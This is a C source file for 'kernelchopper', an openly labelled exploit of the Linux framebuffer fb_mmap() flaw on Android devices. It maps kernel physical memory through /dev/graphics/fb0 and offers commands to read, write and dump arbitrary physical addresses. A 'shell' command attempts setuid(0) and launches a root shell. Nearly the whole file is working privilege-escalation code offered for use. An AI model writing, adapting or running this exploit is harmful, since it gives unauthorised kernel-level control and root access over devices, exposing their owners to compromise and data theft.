/*
 * kernelchopper.c - an open source Linux fb_mmap() exploit
 * Based on analysis of motochopper by djrbliss
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 * 
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 * 
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

#include <errno.h>
#include <fcntl.h>
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <linux/fb.h>

static void die(char *fmt, ...)
{
	va_list ap;

	va_start(ap, fmt);
	vprintf(fmt, ap);
	va_end(ap);
	printf("\n");
	exit(1);
}

static void die_and_print_errno(char *fmt, ...)
{
	va_list ap;

	va_start(ap, fmt);
	vprintf(fmt, ap);
	va_end(ap);
	printf(": %s\n", strerror(errno));
	exit(1);
}

/*
 * suggested starting values
 * map_start + map_len must always equal 0x100000000
 */
static void *map_base = (void *)0x08000000;
static unsigned long map_start = 0x50000000;
static unsigned long map_len = 0xb0000000;

#define STEP			0x1000000
#define MIN_LEN			0x20000000

static void map_kernel_memory(void)
{
	int fd;
	struct fb_fix_screeninfo info;

	/* without O_SYNC is this a cached mapping? */
	fd = open("/dev/graphics/fb0", O_RDWR);
	if (fd < 0)
		die_and_print_errno("can't open fb0 device");
	if (ioctl(fd, FBIOGET_FSCREENINFO, (void *)&info) != 0)
		die_and_print_errno("can't get smem_len");

	/*
	 * The lower our base address, the more memory we can map.  But
	 * the kernel will pick a dumb base address if we don't force it.
	 */
	while (1) {
		map_base = mmap(map_base, 0x1000, PROT_READ | PROT_WRITE,
				MAP_FIXED | MAP_SHARED, fd, 0);
		if (map_base != MAP_FAILED) {
			munmap(map_base, 0x1000);
			break;
		}
		map_base += STEP;
		if (map_base > (void *)0x80000000)
			die("can't pick minimal mmap base address");
	}

	for (; map_len >= MIN_LEN; map_len -= STEP, map_start += STEP) {
		map_base = mmap(map_base, map_len, PROT_READ | PROT_WRITE,
				MAP_FIXED | MAP_SHARED, fd,
				map_start + info.smem_len);
		if (map_base != MAP_FAILED) {
			close(fd);
			return;
		}
		if (errno != ENOMEM)
			die_and_print_errno("unexpected mmap() error");
	}
	die("not enough room to map kernel memory");
}

static void adj_addr(unsigned long *addr, unsigned long len)
{
	if (*addr < map_start || (*addr + len) < *addr)
		die("address out of range (mapping covers %08x..%08x)",
		    map_start, map_start + map_len - 1);
	*addr -= map_start;
}

static unsigned long hexconv(const char *arg)
{
	char *endptr;
	unsigned long val;

	val = strtoul(arg, &endptr, 16);
	if (*arg && !*endptr)
		return val;
	die("invalid hex string: '%s'", arg);
	return 0;
}

static void dump_console(void *mapping, unsigned long disp_addr,
			 unsigned long addr, unsigned long len)
{
	int i, j;
	uint8_t *c = mapping;

	for (i = 0; i < len; i += 16) {
		printf("%08lx: ", disp_addr + i);
		for (j = i; j < (i+16) && j < len; j++)
			printf("%02x ", c[j + addr]);
		printf("\n");
	}
}

static void dump_file(void *mapping, unsigned long addr, unsigned long len,
		      const char *filename)
{
	int fd;

	fd = open(filename, O_CREAT | O_WRONLY | O_TRUNC, 0644);
	if (fd < 0)
		die_and_print_errno("can't open '%s'", filename);
	if (write(fd, mapping + addr, len) != len)
		die("error writing output file");
	close(fd);
}

static void usage(void)
{
	puts("usage:\n");
	puts("  kernelchopper m <addr>                       Read dword at PA <addr>");
	puts("  kernelchopper m <addr> <data> [ <data>... ]  Write dword <data> to PA <addr>");
	puts("  kernelchopper d <addr> [ <len> ] [ <file> ]  Dump range, optionally to a file");
	puts("  kernelchopper shell                          Try to start a root shell");
	exit(1);
}

int main(int argc, char **argv)
{
	unsigned long disp_addr, addr, len;
	uint32_t data, *datap;
	int i;

	if (argc < 2)
		usage();

	if (!strcmp(argv[1], "shell")) {
		if (setuid(0) < 0)
			die_and_print_errno("setuid() failed");
		execl("/system/bin/sh", "/system/bin/sh", NULL);
		die_and_print_errno("execl() failed");
	}

	map_kernel_memory();
	if (argv[1][0] == 'm' && argc == 3) {
		addr = hexconv(argv[2]);
		adj_addr(&addr, 0);
		datap = map_base + addr;

		printf("%08x\n", *datap);
		return 0;
	} else if (argv[1][0] == 'm' && argc >= 4) {
		addr = hexconv(argv[2]);
		adj_addr(&addr, 0);
		datap = map_base + addr;

		for (i = 3; i < argc; i++, datap++) {
			data = hexconv(argv[i]);
			*datap = data;
		}
		return 0;
	} else if (argv[1][0] == 'd') {
		if (argc < 3)
			usage();
		disp_addr = addr = hexconv(argv[2]);
		len = 0x100;

		if (argc >= 4)
			len = hexconv(argv[3]);
		adj_addr(&addr, len);

		if (argc <= 4)
			dump_console(map_base, disp_addr, addr, len);
		else if (argc == 5)
			dump_file(map_base, addr, len, argv[4]);
		else
			usage();
		return 0;
	} else
		usage();

	return 0;
}
